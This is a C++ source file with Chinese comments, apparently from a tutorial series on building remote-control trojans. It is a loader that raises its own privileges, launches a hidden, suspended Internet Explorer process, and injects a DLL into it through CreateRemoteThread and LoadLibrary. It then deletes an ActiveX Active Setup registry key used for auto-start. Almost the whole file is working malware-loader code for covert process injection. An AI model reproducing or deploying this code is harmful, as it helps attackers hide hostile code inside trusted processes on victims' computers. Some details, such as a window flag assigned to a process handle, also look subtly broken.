//////////////////////////////////////////////////////////////////////////
//FileName:	Loader
//Data:		2009-04-06
//REM:		DLL的Loader程序
//////////////////////////////////////////////////////////////////////////

#pragma once
#pragma comment(linker, "/subsystem:windows /entry:main")
#include <Windows.h>
#define DLLNAME	"Dll.dll"
#define REGISTERCLEANSTRING	"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{NS517-0XQO-SKETCHER-19901117-GMAILCOM}"

//////////////////////////////////////////////////////////////////////////
//函数声明部分
//////////////////////////////////////////////////////////////////////////
//为了保险，提个权先
BOOL AddPrivilege(void);
//打开一个IE进程，用于注入
int IExcute(void);
//远程注入IE
BOOL DllInject(int pid,const char* path);
//清理工作
BOOL CleanJob();
//卸载
BOOL Dettach();

int main(int argc,char* argv[])
{
	if (argc==2 && stricmp(argv[1],"-unstall")==0)
	{
		Dettach();
	}

	//为了保险，提个权先
	AddPrivilege();

	int pid = IExcute();

	if (pid==0)
	{
		return 0;
	}

	DllInject(pid,DLLNAME);

	CleanJob();

	return 0;
}
//////////////////////////////////////////////////////////////////////////
//为了保险，提个权先
//////////////////////////////////////////////////////////////////////////
BOOL AddPrivilege(void)
{
	HANDLE	hToken;
	TOKEN_PRIVILEGES	tp;
	LUID	Luid;

	if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
	{
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&Luid))
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = Luid;
	if (!AdjustTokenPrivileges(hToken,0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL))
	{
		return FALSE;
	}

	return TRUE;

}

//////////////////////////////////////////////////////////////////////////
//打开一个IE进程，用于注入
//////////////////////////////////////////////////////////////////////////
int IExcute()
{
	PROCESS_INFORMATION	pi = {0};
	STARTUPINFO	si = {0};

	memset(&si,0,sizeof(si));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;

	pi.hProcess = SW_HIDE;

	//打开一个IE进程
	CreateProcess(NULL,"C:\\Program Files\\Internet Explorer\\iexplore.exe",NULL,NULL,0,CREATE_SUSPENDED,NULL,NULL,&si,&pi);

	return pi.dwProcessId;
}

//////////////////////////////////////////////////////////////////////////
//远程注入IE
//////////////////////////////////////////////////////////////////////////
BOOL DllInject(int pid,const char* path)
{
	HANDLE	hProcess = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE,FALSE,pid);

	int dwSize = lstrlen(path);
	dwSize++;

	LPVOID lpBuf = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_READWRITE);
	if (lpBuf==NULL)
	{
		CloseHandle(hProcess);
		return FALSE;
	}
	DWORD dwWrite;
	if (WriteProcessMemory(hProcess,lpBuf,(LPVOID)path,dwSize,&dwWrite)==FALSE)
	{
		CloseHandle(hProcess);
		return FALSE;

	}
	else if (dwWrite!=dwSize)
	{
		VirtualFreeEx(hProcess,lpBuf,dwSize,MEM_DECOMMIT);
		CloseHandle(hProcess);
		return FALSE;
	}
	//关键API，远程线程创建(用dwWrite替换，省了个int)
	HANDLE hThread = CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)LoadLibrary,lpBuf,0,&dwWrite);
	//等待加载结束
	WaitForSingleObject(hThread,INFINITE);
	VirtualFreeEx(hProcess,lpBuf,dwSize,MEM_DECOMMIT);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//清理工作
//////////////////////////////////////////////////////////////////////////
BOOL CleanJob()
{
	//ActiveX启动，必须删除此键值
	RegDeleteKey(HKEY_CURRENT_USER,REGISTERCLEANSTRING);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//卸载，在远程控制章节中演示
//////////////////////////////////////////////////////////////////////////
BOOL Dettach()
{
	return TRUE;
}